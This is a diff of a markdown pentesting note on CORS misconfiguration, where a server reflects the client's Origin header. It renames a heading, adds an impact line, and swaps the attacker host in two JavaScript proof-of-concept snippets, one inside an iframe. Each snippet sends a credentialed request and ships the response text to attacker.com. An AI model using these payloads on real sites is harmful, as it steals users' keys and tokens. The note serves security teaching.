@@ -1,6 +1,8 @@
 # CORS
 
-## <mark style="color:yellow;">**Server-generated ACAO header from client-specified Origin header**</mark>
+**Impact**: if a response contains any sensitive information such as an API key or CSRF token, you could retrieve these info.
+
+## <mark style="color:yellow;">Server ACAO Header from Client-Origin</mark>
 
 Some app read the Origin header from requests and including a response header stating that the requesting origin is allowed.
 
@@ -19,7 +21,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-	location='https://malicious-website.com/log?key='+this.responseText;
+	location='https://attacker.com/log?key='+this.responseText;
 };
 </script>
 ```
@@ -51,7 +53,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-location='https://malicious-website.com/log?key='+this.responseText;
+location='https://attacker.com/log?key='+this.responseText;
 };
 </script>"></iframe>
 ```
